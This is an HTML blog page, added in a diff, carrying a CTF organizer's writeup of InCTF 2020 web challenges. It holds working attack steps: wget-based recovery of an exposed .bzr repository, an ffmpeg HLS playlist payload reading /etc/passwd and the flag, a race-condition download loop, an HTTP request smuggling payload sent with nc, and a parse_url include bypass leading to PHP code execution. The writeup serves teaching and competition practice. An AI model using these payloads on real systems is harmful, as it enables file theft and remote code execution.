@@ -1,0 +1,215 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>INCTF-WRITEUP(ADMIN) - PlayingWithHacks</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Hello everyone  you’re all doing fine. Recently Aa a part of team bi0s we hosted our annual InCTF-I,"> 
+    <meta name="author" content="Captain-K"> 
+    <link rel="alternative" href="atom.xml" title="PlayingWithHacks" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">PlayingWithHacks</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">INCTF-WRITEUP(ADMIN)</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">INCTF-WRITEUP(ADMIN)</h1>
+        <div class="stuff">
+            <span>August 01, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>Hello everyone  you’re all doing fine. Recently Aa a part of team bi0s we hosted our annual InCTF-International and I authored 1 challenge and co authored 2 other<br>This is the writeup’s for those </p>
+<h1 id="VIDEO-BAZAR-ADMIN-PERSPECTIVE"><a href="#VIDEO-BAZAR-ADMIN-PERSPECTIVE" class="headerlink" title="VIDEO BAZAR -ADMIN PERSPECTIVE"></a>VIDEO BAZAR -ADMIN PERSPECTIVE</h1><p>In this challenge the players are welcomed with a harmless looking index.php page<br>which has only 1 textbox and some text saying <code>ENTER THE SUPER SECRET KEY</code><br>The First Step is to find the hidden <code>.bzr</code> (Use anything like dirb gobuster dirbuster) folder and a quick google will reveal to you that<br>.bzr is basically a open source version control system. Basically its somewhat the same as .git</p>
+<p>After Finding .bzr the next step would be to retrive the source code. But i couldnt find any tools to do it so u might have to manually get it </p>
+<p>steps to follow to get source code</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. Install bzr on your system</span><br><span class="line">2. mkdir inctf</span><br><span class="line">3. cd inctf</span><br><span class="line">4. bzr init</span><br><span class="line">5. echo &#39;testcheck&#39; &gt;file</span><br><span class="line">6. bzr add</span><br><span class="line">7. brz commit</span><br><span class="line">8. rm file</span><br></pre></td></tr></table></figure>
+<p>So Now u have a bzr repository with the .bzr directory<br>Next </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">9. cd .bzr&#x2F;branch</span><br><span class="line">10. rm last-revision</span><br><span class="line">11. wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;branch&#x2F;last-revision</span><br></pre></td></tr></table></figure>
+<p>Basically we are getting and replacing our <code>last-revision</code> with the one on the server<br>We follow the same steps for <code>dirstate</code> and <code>pack-names</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">12. cd ..&#x2F;checkout</span><br><span class="line">13. rm dirstate</span><br><span class="line">14. wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;checkout&#x2F;dirstate</span><br><span class="line">15. cd ..&#x2F;repository</span><br><span class="line">16. rm pack-names</span><br><span class="line">17. wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;pack-names</span><br></pre></td></tr></table></figure>
+<p>So now we have all the important files which point to the commit history<br>Next we do a bzr check<br>which will spit out all the  name of the missing files</p>
+<p>then simply wget them to the approprite folder</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cd .bzr&#x2F;repository&#x2F;indces&#x2F;</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;f66475e1bc8c3b9c86e53a761cb536df.rix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;86b254a3ef28b93ac82c43c31283f23b.rix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;1035bef5d03b940a3385fccc0c082001.rix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;f66475e1bc8c3b9c86e53a761cb536df.iix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;86b254a3ef28b93ac82c43c31283f23b.iix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;1035bef5d03b940a3385fccc0c082001.iix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;f66475e1bc8c3b9c86e53a761cb536df.cix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;86b254a3ef28b93ac82c43c31283f23b.cix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;1035bef5d03b940a3385fccc0c082001.cix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;f66475e1bc8c3b9c86e53a761cb536df.tix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;86b254a3ef28b93ac82c43c31283f23b.tix</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;indices&#x2F;1035bef5d03b940a3385fccc0c082001.tix</span><br><span class="line"></span><br><span class="line">cd ..&#x2F;packs</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;packs&#x2F;1035bef5d03b940a3385fccc0c082001.pack</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;packs&#x2F;86b254a3ef28b93ac82c43c31283f23b.pack</span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;.bzr&#x2F;repository&#x2F;packs&#x2F;f66475e1bc8c3b9c86e53a761cb536df.pack</span><br></pre></td></tr></table></figure>
+
+<p>Then do<br><code>bzr status</code><br>and <code>bzr revert</code><br>And you will have the source files of the challenge</p>
+<p>After Getting the source files you can get the<br>{<code>SUPER SECRET PASSWORD</code>==&gt;<code>THIS_IS_THE_NEW_WAY_TO_DO_STUFF</code>}</p>
+<h2 id="Now-To-the-Second-Part-of-the-challenge"><a href="#Now-To-the-Second-Part-of-the-challenge" class="headerlink" title="Now To the Second Part of the challenge"></a>Now To the Second Part of the challenge</h2><p>In the source code we see its using ffmpeg to convert the videos,<br>and it has ALLOW-EXTENTIONS set to  all,<br>And if you research a bit more u will find that ffmpeg has the ability/bug that it converts txt files to video files too.<br>Now we need to know how HLS playlist is handled</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. When processing a playlist, ffmpeg links all the segment contents together and processes them as a separate file</span><br><span class="line">2. Ffmpeg uses the first segment of playlist to determine the file type</span><br><span class="line">3. Ffmpeg uses a special way to process files with. TXT suffix. It will try to print the contents of the file on the screen as a terminal</span><br></pre></td></tr></table></figure>
+<p>So basically </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXTM3U</span><br><span class="line">EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">EXTINF:1.0</span><br><span class="line">GOD.txt</span><br><span class="line"></span><br><span class="line">EXTINF:1.0</span><br><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Ffmpeg sees the <code>EXTM3U</code> tag in the GAB2 subtitle block, and confirms that the file type is HLS playlist.<br>Now even though the file God.txt doesnt exist  name is enough for ffmpeg to detect the file type as TXT<br>Ffmpeg links the contents of all segments of the playlist together, because only the file / etc / passwd actually exists, so the final content is the content of the / etc / passwd file<br>Because the file type is TXT, ffmpeg draws a terminal to print the file.</p>
+</blockquote>
+<p>Now file:// is blacklisted in the source code No problem<br>we can just direclty do <code>/etc/passwd</code></p>
+<p>So now we have file read on the system </p>
+<h3 id="how-do-we-retrive-the-file"><a href="#how-do-we-retrive-the-file" class="headerlink" title="how do we retrive the file"></a>how do we retrive the file</h3><p>if you see there is a sleep statement before the deletion of the files<br>and the file names are always the same (md5 of the given filename)<br>So we can easily execute a race condition to download the file before it gets deleted</p>
+<h2 id="FINAL-PAYLOAD-FOR-SECOND-PART"><a href="#FINAL-PAYLOAD-FOR-SECOND-PART" class="headerlink" title="FINAL PAYLOAD FOR SECOND PART"></a>FINAL PAYLOAD FOR SECOND PART</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:1.0</span><br><span class="line">GOD.txt</span><br><span class="line">#EXTINF:1.0</span><br><span class="line">&#x2F;flag</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Paste into a file with .mp4 extention (any extention will do)<br>convert to something<br>Race to download the file and read the flag</p>
+</blockquote>
+<p>and Race condition</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while 1</span><br><span class="line">do </span><br><span class="line">wget http:&#x2F;&#x2F;35.211.92.233:8001&#x2F;upload&#x2F;&lt;FILE&gt;.&lt;EXTENTIOn&gt;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+<p>HOPE YOU ENJOYED IT :)</p>
+<h2 id="REFERENCES-USE-TO-MAKE-CHALLENGE"><a href="#REFERENCES-USE-TO-MAKE-CHALLENGE" class="headerlink" title="REFERENCES USE TO MAKE CHALLENGE"></a>REFERENCES USE TO MAKE CHALLENGE</h2><blockquote>
+<p><a href="https://ctftime.org/writeup/13380" target="_blank" rel="noopener">https://ctftime.org/writeup/13380</a><br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf</a><br><a href="https://developpaper.com/analysis-of-ffmpeg-arbitrary-file-reading-vulnerability/" target="_blank" rel="noopener">https://developpaper.com/analysis-of-ffmpeg-arbitrary-file-reading-vulnerability/</a></p>
+</blockquote>
+<h1 id="Buggy"><a href="#Buggy" class="headerlink" title="Buggy"></a>Buggy</h1><p>This challenge was created my <a href="C3rB3ru5">https://twitter.com/<strong>c3rb3ru5</strong></a> and I.<br>The original concept was Request smuggling along with SSRF, Lets see how<br>When we start the challenge, We are greeted with a login page and there is an option to register too but when we go there it says forbidden<br>so lets dive a bit deeper check the requests being sent<br>in the req we find that the server used is <code>ATS/7.1.1</code>. This is there first hint<br>A bit of searching and you will find that  <code>ATS/7.1.1</code> Suffers from improper checking of the content-length on an cache-hit<br>So we can use this to smuggle ourselves a register request to the backednd</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">printf &#39;GET &#x2F;index.html HTTP&#x2F;1.1\r\n&#39;\   </span><br><span class="line">&#39;Host: buggy.web.inctf.in\r\n&#39;\</span><br><span class="line">&#39;Content-Length: 96\r\n&#39;\</span><br><span class="line">&#39;\r\n&#39;\</span><br><span class="line">&#39;GET &#x2F;register.php?username&#x3D;mja&amp;password&#x3D;lpa&amp;submit&#x3D;submit HTTP&#x2F;1.1\r\n&#39;\</span><br><span class="line">&#39;Host: buggy.web.inctf.in\r\n&#39;\</span><br><span class="line">&#39;\r\n&#39;\</span><br><span class="line">&#39;GET &#x2F;index.php?echo&#x3D;2 HTTP&#x2F;1.1\r\n&#39;\</span><br><span class="line">&#39;Host: buggy.web.inctf.in\r\n&#39;\</span><br><span class="line">&#39;\r\n&#39;\</span><br><span class="line">|nc -q 1 buggy.web.inctf.in 80</span><br></pre></td></tr></table></figure>
+<p>So next we just login and off to the second stage<br>in the second part there seems to be some sort of file uploader and it allows us to upload any sort of file but it removes the extention and converts the name to md5<br>after uploading there is also an option to include that file<br>but there is a check on include such that only files with the scheme <code>http|https</code> are allowed<br>and if you try to do a rfi it doesnt allow it :P<br>Here we basically had to exploit parse_url to make it such that </p>
+<blockquote>
+<p>parse_url()[‘scheme’]==’http|https’<br>and include reads that file<br>to do this we can use a payload like http:asd../../../../../../<file><br>what this does is that it tricks parse_url such that the scheme is shown as http and the path is taken as the rest, Now what include does it it takes the whole thing as a internal path as its not in proper  url format and includes the file.<br>Yay so now we can get rce via uploading some arbitary file with php content ie <?php var_dump(scandir('.;)); ?>.<br>The flag was in config.php</file></p>
+</blockquote>
+<h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p><code>inctf{REQU357_5MUGG71NG_4ND_1NCLUD3_F0R_TH3_W1N}</code></p>
+<h1 id="XSQLI"><a href="#XSQLI" class="headerlink" title="XSQLI"></a>XSQLI</h1><p>Az3z3l can explain it much better than me go check this blog<br><a href="https://az3z3l.github.io/pages/contents.html" target="_blank" rel="noopener">Writeup</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/Captain-K-101'
+        data-o='https://github.com/Captain-K-101'
+        data-a=''
+        data-d='false'
+    >View comments</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
